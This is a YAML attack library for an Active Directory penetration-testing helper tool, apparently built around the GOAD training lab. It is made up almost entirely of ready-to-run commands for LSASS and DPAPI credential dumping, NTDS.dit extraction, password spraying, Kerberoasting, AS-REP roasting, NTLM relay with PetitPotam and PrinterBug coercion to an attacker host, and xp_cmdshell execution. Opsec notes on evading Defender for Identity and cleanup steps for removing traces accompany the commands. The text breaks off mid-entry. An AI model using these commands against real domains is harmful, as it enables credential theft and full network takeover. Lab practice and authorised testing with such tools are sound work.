# ═══════════════════════════════════════════════════════════════════════
# AD▸PWN Master Attacks YAML
# PURPOSE: Load once via "⚡ Load Attacks" — attacks persist in
#          localStorage so they survive page refresh.  Reload this YAML
#          whenever you add or update attacks.
#
# To make attacks truly permanent (baked into the HTML):
#   1. Load this YAML in the browser (all attacks appear immediately)
#   2. Open DevTools → Application → Local Storage → adpwn_v3
#   3. The ATTACKS object is merged into saved state.
#   OR: Copy the contents of the "attacks" array below into the ATTACKS
#       const in ad_helper_fixed.html directly — each object maps 1:1.
#
# tab values (exact match required):
#   Enumeration | Credential Attacks | Lateral Movement
#   Privilege Escalation | ADCS | Domain Dominance
# ═══════════════════════════════════════════════════════════════════════

attacks:

  # ══════════════════════════════════════
  # ENUMERATION
  # ══════════════════════════════════════

  - id: nmap_initial
    name: Nmap — Initial Host & Service Discovery
    tab: Enumeration
    requires: [SUBNET]
    tags: [nmap, recon, ports, enum]
    description: Initial network sweep to identify live hosts, open ports, services, and OS fingerprints.
    commands:
      - label: Ping sweep — live host discovery
        cmd: "nmap -sn {SUBNET} -oA /tmp/sweep"
      - label: Top 1000 ports — fast scan
        cmd: "nmap --top-ports 1000 -sV -sC -oA /tmp/quick {SUBNET}"
      - label: Full port scan — all 65535 ports
        cmd: "nmap -p- --min-rate 5000 -sV -oA /tmp/full {TARGET_IP}"
      - label: SMB / AD specific ports
        cmd: "nmap -p 53,88,135,139,389,443,445,464,636,3268,3269,3389,5985,9389 -sV -sC {DC_IP}"
      - label: OS fingerprinting
        cmd: "nmap -O --osscan-guess {TARGET_IP}"
      - label: SMB vulnerability scripts
        cmd: "nmap --script smb-vuln*,smb-security-mode -p 445 {SUBNET}"
    next_steps:
      - "Run SMB enumeration against discovered hosts"
      - "Run LDAP enumeration against identified Domain Controllers"
      - "Check for web services on 80/443/8080/8443"
    opsec: "Nmap SYN scans generate half-open connections visible in network logs. Use --scan-delay for stealth."

  - id: enum4linux_full
    name: Enum4linux-ng — Full AD Enumeration
    tab: Enumeration
    requires: [DC_IP, DOMAIN]
    tags: [enum, rpc, smb, ldap, no-creds]
    description: Comprehensive unauthenticated and authenticated enumeration via RPC, SMB, and LDAP.
    commands:
      - label: Unauthenticated full enum
        cmd: "enum4linux-ng {DC_IP} -oA /tmp/enum4linux"
      - label: Authenticated full enum
        cmd: "enum4linux-ng {DC_IP} -u {USERNAME} -p '{PASSWORD}' -A -oA /tmp/enum4linux_auth"
      - label: RPC null session users
        cmd: "rpcclient -U '' -N {DC_IP} -c 'enumdomusers; enumdomgroups; querydominfo; getdompwinfo'"
      - label: Enumerate password policy
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --pass-pol"
    next_steps:
      - "Use discovered usernames for password spraying"
      - "Check lockout threshold before spraying"
      - "Feed usernames to AS-REP roast"
    opsec: "RPC and LDAP enumeration queries are logged on the DC. Null sessions are unusual and may alert."

  - id: ldapdomaindump_full
    name: LDAPDomainDump — Full Domain Dump
    tab: Enumeration
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [ldap, enum, users, groups, computers]
    description: Dump all domain objects to JSON/HTML files for offline analysis. Includes users, groups, computers, GPOs, trusts.
    commands:
      - label: Full domain dump
        cmd: "ldapdomaindump -u '{DOMAIN}\\{USERNAME}' -p '{PASSWORD}' {DC_IP} -o /tmp/ldap_dump"
      - label: View dump in browser
        cmd: "python3 -m http.server 8000 --directory /tmp/ldap_dump"
      - label: Extract users with admin count
        cmd: "cat /tmp/ldap_dump/domain_users.json | python3 -c \"import json,sys; [print(u['attributes']['sAMAccountName'][0]) for u in json.load(sys.stdin) if u['attributes'].get('adminCount','') == [1]]\""
      - label: Extract computers
        cmd: "cat /tmp/ldap_dump/domain_computers.json | python3 -c \"import json,sys; [print(c['attributes']['dNSHostName'][0]) for c in json.load(sys.stdin) if c['attributes'].get('dNSHostName')]\""
    next_steps:
      - "Review admin-count users for escalation paths"
      - "Find accounts with password-never-expires"
      - "Identify service accounts for Kerberoasting"
    opsec: "Bulk LDAP queries are unusual and detectable by EDR/SIEM. Consider targeted queries in sensitive environments."

  - id: nxc_user_hunting
    name: NetExec — User & Session Hunting
    tab: Enumeration
    requires: [SUBNET, USERNAME, PASSWORD, DOMAIN]
    tags: [enum, sessions, logged-on, user-hunting]
    description: Hunt for privileged user sessions across the network. Find where Domain Admins are logged in.
    commands:
      - label: Find logged-on users across subnet
        cmd: "nxc smb {SUBNET} -u {USERNAME} -p '{PASSWORD}' --loggedon-users"
      - label: Find active sessions
        cmd: "nxc smb {SUBNET} -u {USERNAME} -p '{PASSWORD}' --sessions"
      - label: Hunt for specific user sessions
        cmd: "nxc smb {SUBNET} -u {USERNAME} -p '{PASSWORD}' --loggedon-users | grep -i 'administrator\\|admin\\|da '"
      - label: Enumerate local admins
        cmd: "nxc smb {SUBNET} -u {USERNAME} -p '{PASSWORD}' --local-groups Administrators"
      - label: Check RDP enabled hosts
        cmd: "nxc smb {SUBNET} -u {USERNAME} -p '{PASSWORD}' -M rdp"
    next_steps:
      - "Move to hosts where privileged users are logged on"
      - "Dump credentials from machines where DAs are active"
    opsec: "Session enumeration triggers 4624 type 3 logon events on each probed host. Very visible on well-monitored networks."

  - id: bloodhound_collection
    name: BloodHound — Data Collection
    tab: Enumeration
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [bloodhound, enum, graph, acl, paths]
    description: Collect BloodHound data to map attack paths, ACL abuses, and shortest paths to Domain Admin.
    commands:
      - label: DCOnly collection (quieter)
        cmd: "bloodhound-python -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -ns {DC_IP} -c DCOnly --zip"
      - label: Full collection (all methods)
        cmd: "bloodhound-python -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -ns {DC_IP} -c All --zip"
      - label: ACL collection only
        cmd: "bloodhound-python -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -ns {DC_IP} -c ACL --zip"
      - label: Session collection (loud — connects to hosts)
        cmd: "bloodhound-python -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -ns {DC_IP} -c Session --zip"
      - label: NetExec BloodHound module
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --bloodhound -c All --dns-server {DC_IP}"
    next_steps:
      - "Import zip file into BloodHound GUI"
      - "Run: Shortest Paths to Domain Admins"
      - "Run: Find Principals with DCSync Rights"
      - "Run: Find Computers with Unconstrained Delegation"
      - "Review ACL abuse paths from owned principals"
    opsec: "Session collection is very loud — connects to every host. DCOnly is much quieter."

  - id: sccm_discovery
    name: SCCM / ConfigMgr Discovery
    tab: Enumeration
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: null
    tags: [sccm, enum, mssql, lateral]
    description: >
      Enumerate SCCM/ConfigMgr infrastructure. SCCM often holds credentials,
      deployment packages, scripts, and admin access across the entire fleet.
    commands:
      - label: Find SCCM servers via LDAP
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(objectClass=mSSMSManagementPoint)' 'dNSHostName'"
      - label: Find SCCM via DNS
        cmd: "nslookup -type=SRV _mssms-mp._tcp.{DOMAIN} {DC_IP}"
      - label: SharpSCCM — enumerate site
        cmd: "SharpSCCM.exe get site-info -sms {TARGET_IP}"
      - label: SharpSCCM — enumerate admins
        cmd: "SharpSCCM.exe get class-instances SMS_Admin -sms {TARGET_IP}"
      - label: SharpSCCM — NAA credentials (Network Access Account)
        cmd: "SharpSCCM.exe get naa -sms {TARGET_IP}"
      - label: SCCM MSSQL — check DB access
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q 'SELECT name FROM sys.databases'"
    next_steps:
      - "Extract NAA credentials from SCCM"
      - "Check SCCM admin console access"
      - "Enumerate client push installation accounts"
      - "Look for scripts/packages containing credentials"
    opsec: >
      LDAP queries are logged. SharpSCCM connections appear as normal admin
      traffic on the SCCM server. MSSQL queries are logged in SQL error logs.
    cleanup:
      - label: Remove SharpSCCM binary
        cmd: "del /f {TARGET_COMPUTER}\\C$\\Windows\\Temp\\SharpSCCM.exe"

  - id: mssql_enum
    name: MSSQL Enumeration & Exploitation
    tab: Enumeration
    requires: [DOMAIN, USERNAME, PASSWORD, DC_IP]
    requires_priv: null
    tags: [mssql, enum, rce, lateral]
    description: >
      Discover and exploit MSSQL instances. Linked servers, xp_cmdshell,
      and impersonation are common escalation paths.
    commands:
      - label: Discover MSSQL instances
        cmd: "nxc mssql {SUBNET} -u {USERNAME} -p '{PASSWORD}'"
      - label: Check sysadmin privilege
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q 'SELECT IS_SRVROLEMEMBER(''sysadmin'')'"
      - label: Enable xp_cmdshell (requires sysadmin)
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q \"EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE\""
      - label: Execute command via xp_cmdshell
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'whoami'"
      - label: Enumerate linked servers
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q 'SELECT name,data_source FROM sys.servers'"
      - label: Impersonate another login
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -q \"EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER\""
    next_steps:
      - "Execute commands via xp_cmdshell"
      - "Pivot via linked servers"
      - "Extract MSSQL service account hash for cracking"
    opsec: "xp_cmdshell calls are logged. Impersonation and linked server hops appear in SQL audit logs if enabled."
    cleanup:
      - label: Disable xp_cmdshell
        cmd: "EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;"

  - id: nxc_lsassy
    name: LSASSY — In-Memory Credential Dump
    tab: Credential Attacks
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: local_admin
    tags: [dump, lsass, av-evasion, memory]
    description: >
      Dump LSASS using lsassy which tries multiple methods (procdump, nanodump,
      comsvcs, etc.) to evade AV/EDR. Less noisy than raw mimikatz.
    commands:
      - label: LSASSY via nxc module
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M lsassy"
      - label: LSASSY — scan entire subnet
        cmd: "nxc smb {SUBNET} -u {USERNAME} -p '{PASSWORD}' -M lsassy --continue-on-success"
      - label: LSASSY standalone
        cmd: "lsassy -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} {TARGET_IP}"
      - label: LSASSY with hash
        cmd: "lsassy -u {USERNAME} -H {NTLM_HASH} -d {DOMAIN} {TARGET_IP}"
    next_steps:
      - "Promote harvested credentials in Creds tab"
      - "Use admin hashes for PTH across subnet"
      - "Check for DA tokens in memory"
    opsec: "Lsassy uses multiple evasion methods but LSASS access is still logged (Event 4656). Some EDRs detect all LSASS reads."

  - id: nxc_dpapi
    name: DPAPI — Browser & Credential Manager Dump
    tab: Credential Attacks
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    requires_priv: local_admin
    tags: [dpapi, browser, creds, cleartext]
    description: >
      Dump DPAPI-protected secrets: browser saved passwords (Chrome, Edge,
      Firefox), Windows Credential Manager, and DPAPI master keys.
    commands:
      - label: DPAPI module (all)
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M dpapi"
      - label: Chrome passwords
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M dpapi --options CHROME=True"
      - label: Credential Manager
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M dpapi --options CREDMAN=True"
      - label: Impacket dpapimodule
        cmd: "impacket-dpapi masterkey -file '/path/to/masterkey' -password '{PASSWORD}'"
    next_steps:
      - "Review browser saved passwords for admin credentials"
      - "Check Credential Manager for VPN / RDP credentials"
    opsec: "Remote DPAPI access requires file reads from the user profile — generates 4663 events."

  - id: nxc_ntdsutil
    name: NTDS via NTDSUtil / VSS (Shadow Copy)
    tab: Domain Dominance
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    requires_priv: da
    tags: [ntds, vss, shadowcopy, dump, stealthy]
    description: >
      Extract NTDS.dit via Volume Shadow Copy (VSS). Avoids the DRSUAPI
      replication method used by secretsdump — significantly stealthier
      against Microsoft Defender for Identity.
    commands:
      - label: NXC NTDS via VSS
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --ntds vss"
      - label: Secretsdump with VSS flag
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -use-vss -outputfile /tmp/ntds_vss"
      - label: Manual VSS via NXC exec
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -x 'ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\vss_dump\" q q'"
      - label: Retrieve dumped files
        cmd: "impacket-smbclient {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -c 'get C:\\vss_dump\\Active Directory\\ntds.dit'"
    next_steps:
      - "Extract KRBTGT hash"
      - "Crack high-value account hashes offline"
      - "Document all extracted hashes for report"
    opsec: >
      VSS creation generates System event 7036 and Security event 4985.
      Stealthier than DCSync (no 4662 replication events) but VSS creation
      is still visible in event logs.
    cleanup:
      - label: Delete VSS dump folder
        cmd: "rmdir /s /q C:\\vss_dump"
      - label: Delete shadow copy (if created)
        cmd: "vssadmin delete shadows /for=C: /quiet"

  - id: netbios_scan
    name: NetBIOS / SMB Discovery
    tab: Enumeration
    requires:
      - SUBNET
    requires_priv: null
    tags:
      - enum
      - smb
      - netbios
      - no-creds
    description: >
      First step in GOAD — scan the subnet for Windows hosts via SMB/NetBIOS.
      Identifies all hosts, domain names, signing status and DC candidates.
      Signing disabled = relay target.
    commands:
      - label: "SMB scan — identify all hosts, domains, signing"
        cmd: "nxc smb {SUBNET}"
      - label: "Generate relay target list (signing=False)"
        cmd: "nxc smb {SUBNET} --gen-relay-list /tmp/relay_targets.txt"
      - label: "Nmap targeted ports"
        cmd: "nmap -sV -sC -p 445,139,389,636,3268,3389,5985,1433 {SUBNET} -oA /tmp/nmap"
    next:
      - Identify DC IP and domain names
      - Check for SMB signing disabled hosts for relay
      - Enumerate users with Kerbrute or enum4linux-ng
    opsec: >
      SMB broadcast scans are visible on network monitoring. Use targeted scans
      rather than broad sweeps where possible.
    cleanup: []

  - id: user_enum_nocreds
    name: User Enum — No Credentials
    tab: Enumeration
    requires:
      - DC_IP
      - DOMAIN
    requires_priv: null
    tags:
      - enum
      - kerberos
      - username-enum
      - no-creds
    description: >
      Enumerate valid domain users without credentials using Kerberos pre-auth
      errors (Kerbrute) and RPC null sessions. Essential first step to build
      a user list for AS-REP roasting and password spraying.
    commands:
      - label: "Kerbrute — enumerate users via Kerberos"
        cmd: "kerbrute userenum --dc {DC_IP} --domain {DOMAIN} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 -o /tmp/valid_users.txt"
      - label: "enum4linux-ng — full null session enum"
        cmd: "enum4linux-ng -A {DC_IP}"
      - label: "RPC null session — list users"
        cmd: "rpcclient -U '' -N {DC_IP} -c 'enumdomusers'"
      - label: "Check machine account quota (MAQ)"
        cmd: "nxc ldap {DC_IP} -u '' -p '' -M maq"
    next:
      - Run AS-REP roasting against discovered users
      - Password spray common passwords against user list
      - Check MAQ — if >0 you can add computers (needed for NoPac/RBCD)
    opsec: >
      Kerbrute user enumeration generates 4768 events per attempt. Keep threads
      low (5-10) to avoid triggering lockouts or IDS alerts.
    cleanup: []

  - id: enum_with_creds
    name: Domain Enumeration — With Credentials
    tab: Enumeration
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
    requires_priv: null
    tags:
      - enum
      - ldap
      - bloodhound
    description: >
      Full domain enumeration once a valid credential is obtained.
      Collects users, computers, groups, ACLs, delegations and SPNs.
      BloodHound data is the most valuable output for attack path planning.
    commands:
      - label: "BloodHound — collect all data"
        cmd: "bloodhound-python -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -ns {DC_IP} -c All --zip -o /tmp/bloodhound/"
      - label: "Enumerate users with descriptions (check for passwords)"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --users"
      - label: "Enumerate password policy"
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --pass-pol"
      - label: "Enumerate shares across subnet"
        cmd: "nxc smb {SUBNET} -u {USERNAME} -p '{PASSWORD}' --shares"
      - label: "Check admin count=1 users (over-privileged)"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --admin-count"
      - label: "Find computers with unconstrained/constrained delegation"
        cmd: "impacket-findDelegation {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: "Enumerate ADCS — find vulnerable templates"
        cmd: "certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout"
    next:
      - Load BloodHound data and look for shortest path to DA
      - Check user descriptions for cleartext passwords
      - Find Kerberoastable and AS-REP roastable accounts
      - Check delegation misconfigurations
      - Review ADCS template vulnerabilities
    opsec: >
      LDAP queries are logged. BloodHound collection is noisy — consider
      using stealth collection options in production engagements.
    cleanup: []

  # ══════════════════════════════════════
  # CREDENTIAL ATTACKS
  # ══════════════════════════════════════

  - id: spray_season_password
    name: Seasonal Password Spray
    tab: Credential Attacks
    requires: [DC_IP, DOMAIN]
    tags: [spray, password, lockout-risk, seasonal]
    description: >
      Spray seasonal and company-pattern passwords. Always check lockout policy first.
      Common patterns: Season+Year!, CompanyName+Year!, Welcome1!, Password1!
    commands:
      - label: Check lockout policy FIRST
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '' --pass-pol"
      - label: Spray single password — SMB
        cmd: "nxc smb {DC_IP} -u /tmp/users.txt -p 'Summer2024!' --continue-on-success"
      - label: Spray multiple passwords from file
        cmd: "nxc smb {DC_IP} -u /tmp/users.txt -p /tmp/passwords.txt --no-bruteforce --continue-on-success"
      - label: Kerbrute spray (no failed logon events if wrong password)
        cmd: "kerbrute passwordspray --dc {DC_IP} --domain {DOMAIN} /tmp/users.txt 'Summer2024!'"
      - label: Generate seasonal password list
        cmd: "for p in 'Spring2024!' 'Summer2024!' 'Fall2024!' 'Autumn2024!' 'Winter2024!' 'Jan2024!' 'Welcome1!' 'Password1!' '{DOMAIN}2024!'; do echo $p; done > /tmp/seasonal.txt"
    next_steps:
      - "Use successful credentials for LDAP/BloodHound enumeration"
      - "Check if any successful accounts have admin rights"
      - "Kerberoast with newly obtained credentials"
    opsec: >
      CRITICAL: Check lockout threshold first. Leave at least 2 attempts below threshold.
      Wait minimum 30 minutes between spray rounds. Generates 4625 events per failed attempt.
      Kerbrute does NOT generate 4625 — only 4768 — stealthier for domain spraying.

  - id: responder_capture
    name: Responder — LLMNR/NBT-NS Poisoning
    tab: Credential Attacks
    requires: [ATTACKER_IP]
    tags: [responder, llmnr, nbns, capture, ntlmv2]
    description: Poison LLMNR/NBT-NS/mDNS broadcasts to capture NTLMv2 hashes from hosts that make typos or access non-existent resources.
    commands:
      - label: Start Responder (full capture mode)
        cmd: "responder -I eth0 -dPv"
      - label: Responder with SMB+HTTP disabled (relay mode)
        cmd: "responder -I eth0 -dPv --no-smb-server --no-http-server"
      - label: Crack captured hashes
        cmd: "hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
      - label: View captured hashes
        cmd: "cat /usr/share/responder/logs/Responder-Session.log | grep 'NTLMv2'"
    next_steps:
      - "Crack NTLMv2 hashes offline"
      - "Relay instead of cracking (if SMB signing disabled)"
    opsec: "Responder disrupts legitimate LLMNR/NBT-NS resolutions — visible to network monitoring. Very loud. Run during business hours for more captures."
    cleanup:
      - label: Stop Responder
        cmd: "pkill responder"

  - id: relay_with_coercion
    name: NTLM Relay + Coercion (Full Chain)
    tab: Credential Attacks
    requires: [DC_IP, CA_IP, ATTACKER_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [relay, ntlm, coerce, petitpotam, printerbug, adcs]
    description: >
      Full relay chain: identify targets without SMB signing, coerce DC authentication
      via PetitPotam or PrinterBug, relay to ADCS or LDAP for privilege escalation.
    commands:
      - label: Find relay targets (no SMB signing)
        cmd: "nxc smb {SUBNET} --gen-relay-list /tmp/relay_targets.txt"
      - label: Start relay to ADCS Web Enrollment
        cmd: "impacket-ntlmrelayx -t http://{CA_IP}/certsrv/certfnsh.asp --adcs --template DomainController"
      - label: Start relay to LDAP (dump / RBCD)
        cmd: "impacket-ntlmrelayx -t ldaps://{DC_IP} --delegate-access --no-dump --no-da --no-acl"
      - label: Coerce — PetitPotam (authenticated)
        cmd: "python3 PetitPotam.py -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} {ATTACKER_IP} {DC_IP}"
      - label: Coerce — PrinterBug (requires Spooler)
        cmd: "python3 printerbug.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} {ATTACKER_IP}"
      - label: Coerce — DFSCoerce
        cmd: "python3 dfscoerce.py -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} {ATTACKER_IP} {DC_IP}"
      - label: Auth with obtained DC cert
        cmd: "certipy auth -pfx dc.pfx -dc-ip {DC_IP}"
    next_steps:
      - "Use DC machine hash for DCSync"
      - "Escalate via RBCD if relayed to LDAP"
    opsec: "Coercion is detectable. Relay is stealthy if target doesn't log NTLM auth. PetitPotam generates EFS RPC calls."
    cleanup:
      - label: Stop Responder
        cmd: "pkill responder"

  - id: hashcat_crack_all
    name: Hashcat — Crack All Common Hash Types
    tab: Credential Attacks
    requires: []
    tags: [hashcat, crack, ntlm, kerberoast, asrep]
    description: Crack NTLM, NTLMv2, Kerberoast TGS, AS-REP, and NetNTLMv2 hashes offline.
    commands:
      - label: Crack NTLM hashes
        cmd: "hashcat -m 1000 /tmp/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
      - label: Crack Kerberoast TGS hashes
        cmd: "hashcat -m 13100 /tmp/spns.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
      - label: Crack AS-REP hashes
        cmd: "hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
      - label: Crack NetNTLMv2 (Responder)
        cmd: "hashcat -m 5600 /tmp/netntlmv2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
      - label: Show all cracked
        cmd: "hashcat --show -m 1000 /tmp/ntlm_hashes.txt --username"
      - label: Generate company-specific wordlist
        cmd: "cewl https://{DOMAIN} -m 5 -w /tmp/company_words.txt && hashcat -m 1000 /tmp/ntlm_hashes.txt /tmp/company_words.txt -r best64.rule"

  - id: asrep_roast
    name: AS-REP Roasting — No Creds
    tab: Credential Attacks
    requires:
      - DC_IP
      - DOMAIN
    requires_priv: null
    tags:
      - asrep
      - kerberos
      - offline-crack
      - no-creds
    description: >
      Retrieve AS-REP hashes for accounts with pre-authentication disabled.
      In GOAD several accounts have this misconfiguration. No credentials
      required — only a user list from Kerbrute enumeration.
    commands:
      - label: "AS-REP roast with user list (no creds)"
        cmd: "impacket-GetNPUsers {DOMAIN}/ -no-pass -usersfile /tmp/valid_users.txt -dc-ip {DC_IP} -format hashcat -outputfile /tmp/asrep.txt"
      - label: "AS-REP roast with credentials (find all)"
        cmd: "impacket-GetNPUsers {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -no-pass -format hashcat -outputfile /tmp/asrep.txt"
      - label: "NetExec AS-REP roast"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --asreproast /tmp/asrep.txt"
      - label: "Crack AS-REP hashes"
        cmd: "hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o /tmp/asrep_cracked.txt"
    next:
      - Spray cracked password with nxc smb across subnet
      - Check if cracked account is Kerberoastable
      - Run full enumeration with new credentials
      - Check BloodHound for DA path from compromised account
    opsec: >
      Generates 4768 events. Single targeted run is low noise.
      Mass roasting against many accounts is more detectable.
    cleanup:
      - label: "Remove hash files"
        cmd: "rm -f /tmp/asrep.txt /tmp/asrep_cracked.txt"

  - id: kerberoast
    name: Kerberoasting — SPN Accounts
    tab: Credential Attacks
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
    requires_priv: null
    tags:
      - kerberoast
      - spn
      - offline-crack
    description: >
      Request TGS tickets for all SPN accounts and crack offline.
      GOAD has multiple Kerberoastable service accounts with weak passwords.
      Focus on high-value SPNs like MSSQLSvc.
    commands:
      - label: "GetUserSPNs — request all TGS tickets"
        cmd: "impacket-GetUserSPNs {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -request -outputfile /tmp/spns.txt"
      - label: "NetExec kerberoast"
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --kerberoasting /tmp/spns.txt"
      - label: "Crack TGS hashes"
        cmd: "hashcat -m 13100 /tmp/spns.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o /tmp/spns_cracked.txt"
      - label: "Targeted kerberoast — single user"
        cmd: "impacket-GetUserSPNs {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -request-user {TARGET_USER} -outputfile /tmp/spn_target.txt"
    next:
      - Spray cracked password with nxc smb (look for Pwn3d!)
      - Check if service account has local admin rights anywhere
      - Check if account has MSSQL access (sysadmin)
      - Review BloodHound for escalation paths from service account
    opsec: >
      TGS requests are normal Kerberos traffic. Requesting all SPNs at once
      is detectable. Prefer targeted requests for specific high-value SPNs.
    cleanup:
      - label: "Remove hash files"
        cmd: "rm -f /tmp/spns.txt /tmp/spns_cracked.txt /tmp/spn_target.txt"

  - id: password_spray
    name: Password Spray — Common Passwords
    tab: Credential Attacks
    requires:
      - DC_IP
      - DOMAIN
    requires_priv: null
    tags:
      - spray
      - lockout-risk
      - no-creds
    description: >
      Spray common passwords across all domain users. GOAD has many accounts
      with weak/default passwords (e.g. Password123!, Welcome1, Summer2023).
      CHECK LOCKOUT POLICY FIRST — default is 5 attempts.
    commands:
      - label: "Check lockout policy FIRST"
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --pass-pol"
      - label: "Password spray via SMB"
        cmd: "nxc smb {DC_IP} -u /tmp/valid_users.txt -p '{PASSWORD}' --continue-on-success"
      - label: "Password spray via Kerbrute (Kerberos)"
        cmd: "kerbrute passwordspray --dc {DC_IP} --domain {DOMAIN} /tmp/valid_users.txt '{PASSWORD}'"
      - label: "Spray multiple passwords from file"
        cmd: "nxc smb {DC_IP} -u /tmp/valid_users.txt -p /tmp/passwords.txt --no-bruteforce --continue-on-success"
    next:
      - Use successful credentials for full domain enumeration
      - Check if any successful account has local admin
      - Kerberoast with new credentials
      - Run BloodHound collection with working account
    opsec: >
      ⚠ CHECK LOCKOUT POLICY FIRST. Default 5 attempts. Leave 2+ attempt buffer.
      Wait 30+ minutes between rounds. Spray from multiple source IPs if possible.
    cleanup: []

  - id: gpp_password
    name: GPP Password — SYSVOL
    tab: Credential Attacks
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
    requires_priv: null
    tags:
      - gpp
      - sysvol
      - cleartext
      - easy-win
    description: >
      Extract and decrypt Group Policy Preferences passwords stored in SYSVOL.
      GOAD has GPP passwords configured. Readable by all domain users.
      Pre-MS14-025 — still found in many environments.
    commands:
      - label: "NetExec GPP password module"
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M gpp_password"
      - label: "NetExec GPP autologon"
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M gpp_autologin"
      - label: "Manual decrypt cpassword"
        cmd: "gpp-decrypt '<cpassword_value>'"
      - label: "Manual SYSVOL browse"
        cmd: "smbclient \\\\{DC_IP}\\SYSVOL -U '{DOMAIN}\\{USERNAME}%{PASSWORD}' -c 'recurse on; ls'"
    next:
      - Verify recovered credentials are still active
      - Check scope — local admin or domain account?
      - Add to credential vault and re-enumerate
    opsec: >
      Read-only SYSVOL access — minimal noise. No events generated for reading files.
    cleanup: []

  - id: mssql_abuse
    name: MSSQL Privilege Abuse
    tab: Credential Attacks
    requires:
      - DC_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
      - TARGET_IP
    requires_priv: null
    tags:
      - mssql
      - xp_cmdshell
      - linked-servers
    description: >
      GOAD has MSSQL servers with Kerberoastable service accounts and
      linked server configurations. Abuse sysadmin access or linked servers
      to execute commands and move laterally.
    commands:
      - label: "Enumerate MSSQL instances on subnet"
        cmd: "nxc mssql {SUBNET} -u {USERNAME} -p '{PASSWORD}'"
      - label: "Enumerate MSSQL users and roles"
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M mssql_priv"
      - label: "Enable and execute xp_cmdshell"
        cmd: "nxc mssql {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'whoami'"
      - label: "Enumerate linked servers"
        cmd: "impacket-mssqlclient {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} -windows-auth -q 'SELECT * FROM sys.servers'"
      - label: "Execute via linked server chain"
